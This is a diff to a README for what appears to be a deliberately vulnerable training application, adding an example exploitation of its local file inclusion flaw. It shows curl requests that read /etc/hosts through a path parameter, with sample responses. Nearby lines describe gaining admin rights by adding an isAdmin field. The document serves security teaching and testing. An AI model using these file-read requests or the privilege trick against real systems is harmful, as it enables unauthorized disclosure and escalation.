@@ -214,6 +214,57 @@ Full configuration & usage examples can be found in our [demo project](https://g
 
 - **Local File Inclusion (LFI)** - The /api/files endpoint returns any file on the server from the path that is provided in the _path_ param. The UI uses this endpoint to load crystal images on the landing page.
 
+  <details>
+    <summary>Example Exploitation</summary>
+
+  To demonstrate file disclosure, you can use the following `curl` commands:
+
+  1.  Accessing the `/etc/hosts` File with GET /api/file/raw
+
+      ```bash
+      curl https://brokencrystals.com/api/file/raw\?path\=/etc/hosts
+      ```
+
+      Example Response:
+
+      ```text
+      # Kubernetes-managed hosts file.
+      127.0.0.1       localhost
+      ::1     localhost ip6-localhost ip6-loopback
+      fe00::0 ip6-localnet
+      fe00::0 ip6-mcastprefix
+      fe00::1 ip6-allnodes
+      fe00::2 ip6-allrouters
+      10.0.46.108     brokencrystals-56b48bd6f9-j4x8c
+
+      # Entries added by HostAliases.
+      127.0.0.1       postgres        keycloak-postgres       keycloak        nodejs  proxy   repeater        db      brokencrystals.local
+      ```
+
+  2.  Accessing the `/etc/hosts` File with GET /api/file/
+
+           ```bash
+           curl https://brokencrystals.com/api/file\?path\=/etc/hosts
+           ```
+
+           Example Response:
+
+           ```text
+           # Kubernetes-managed hosts file.
+           127.0.0.1       localhost
+           ::1     localhost ip6-localhost ip6-loopback
+           fe00::0 ip6-localnet
+           fe00::0 ip6-mcastprefix
+           fe00::1 ip6-allnodes
+           fe00::2 ip6-allrouters
+           10.0.46.108     brokencrystals-56b48bd6f9-j4x8c
+
+           # Entries added by HostAliases.
+           127.0.0.1       postgres        keycloak-postgres       keycloak        nodejs  proxy   repeater        db      brokencrystals.local
+           ```
+
+      </details>
+
 - **Mass Assignment** - You can add to user admin privileges upon creating user or updating userdata. When you are creating a new user /api/users/basic you can use additional hidden field in body request { ... "isAdmin" : true }. If you are trying to edit userdata with PUT request /api/users/one/{email}/info you can add this additional field mentioned above. For checking admin permissions there is one more endpoint: /api/users/one/{email}/adminpermission.
 
 - **Open Database** - The index.html file includes a link to manifest URL, which returns the server's configuration, including a DB connection string.
